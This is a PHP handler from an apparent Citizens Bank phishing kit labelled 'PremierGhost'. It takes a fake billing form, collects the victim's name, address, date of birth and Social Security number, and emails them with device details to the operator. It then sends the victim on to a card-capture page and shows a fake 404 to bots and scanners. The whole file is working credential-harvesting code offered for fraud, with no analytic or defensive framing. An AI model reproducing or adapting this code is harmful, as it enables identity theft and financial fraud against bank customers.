<?php

    session_start();

    require_once '../Comp.php';
    require_once '../Antibot.php';
    require_once '../demonTest.php';

    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (isset(
        $_POST['fname'],
        $_POST['address'],
        $_POST['city'],
        $_POST['state'],
        $_POST['zip'],
        $_POST['dob'],
        $_POST['ssn']
    )) {
        if (!$comps->checkEmpty(
            $_POST['fname'],
            $_POST['address'],
            $_POST['city'],
            $_POST['state'],
            $_POST['zip'],
            $_POST['dob'],
            $_POST['ssn']
        )) {
            $_SESSION['fname'] = ucwords($_POST['fname']);
            $_SESSION['address'] = ucwords($_POST['address']);
            $_SESSION['city'] = ucwords($_POST['city']);
            $_SESSION['state'] = ucwords($_POST['state']);
            $_SESSION['zip'] = $_POST['zip'];
            $_SESSION['dob'] = $_POST['dob'];
            $_SESSION['ssn'] = $_POST['ssn'];

            $content = '
                <meta name="viewport" content="width=device-width, initial-scale=1.0">

                <style>
        
                    * {
                        font-family: Arial;
                        font-weight: normal;
                        color: #209DB9;
                        margin: 0;
                        padding: 0;
                    }

                    .text-center {
                        text-align: center;
                    }
        
                    .small {
                        font-size: .8rem;
                    }
        
                    .mt-05 {
                        margin-top: .5rem;
                    }
        
                    .mt-1 {
                        margin-top: 1rem;
                    }
        
                    .mt-2, .my-2 {
                        margin-top: 2rem;
                    }
        
                    .my-3 {
                        margin: 3rem 0;
                    }
        
                    .mb-2, .my-2 {
                        margin-bottom: 2rem;
                    }
        
                    .text-light {
                        color: #8c8c8c;
                    }

                    .text-citizens {
                        color: #209DB9;
                    }
        
                    .container {
                        padding-left: 1.5rem;
                        padding-right: 1.5rem;
                    }
        
                    hr {
                        border: none;
                        margin-top: 1rem;
                        margin-bottom: 1rem;
                        height: 1px;
                        background-color: #8c8c8c;
                    }
        
                </style>

                <div class="text-center my-2">
                    <h4 class="text-light">PremierGhost <span class="text-citizens">Citizens Bank</span> V1.0</h4>
                    <h2>(1) Billing Info from ' . $_SESSION['username'] . '</h2>
                </div>
                
                <div class="container">
                    <div class="mt-2">
                        <div>
                            <h3 class="text-light">🐯 Billing Info</h3>
                        </div>
                        <hr>
                        <div class="mt-2">
                            <h3>Full Name: ' . $_SESSION['fname'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>Address: ' . $_SESSION['address'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>City: ' . $_SESSION['city'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>State: ' . $_SESSION['state'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>ZIP: ' . $_SESSION['zip'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>DOB: ' . $_SESSION['dob'] . '</h3>
                        </div>
                        <div class="mt-05">
                            <h3>SSN: ' . $_SESSION['ssn'] . '</h3>
                        </div>
                        <div class="mt-2">
                            <h3 class="text-light">📱 Device Info</h3>
                        </div>
                        <hr>
                        <div class="mt-2">
                            ' . $comps->userDetails() . '
                        </div>
                    </div>
                    <div class="my-3 text-center">
                        <span class="small text-light">Private page made by <a href="https://t.me/PremierGhost" target="_blank">PremierGhost</a>, not for redistribution.</span>
                    </div>
                </div>
            ';

            if ($comps->mailX("(1) Billing | Citizens Bank", $content)) {
                $comps->log(
                    "../../Guard/Audio/live.txt",
                    "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) Billing\n\n"
                );
                die($comps->headerX("../../Login/card.php"));
            } else {
                die($antibot->throw404());
            }
        } else {
            echo $antibot->throw404();
            $comps->log(
                "../../Guard/Audio/kill.txt",
                "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
            );
            die();
        }
    } else {
        echo $antibot->throw404();
        $comps->log(
            "../../Guard/Audio/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
        );
        die();
    }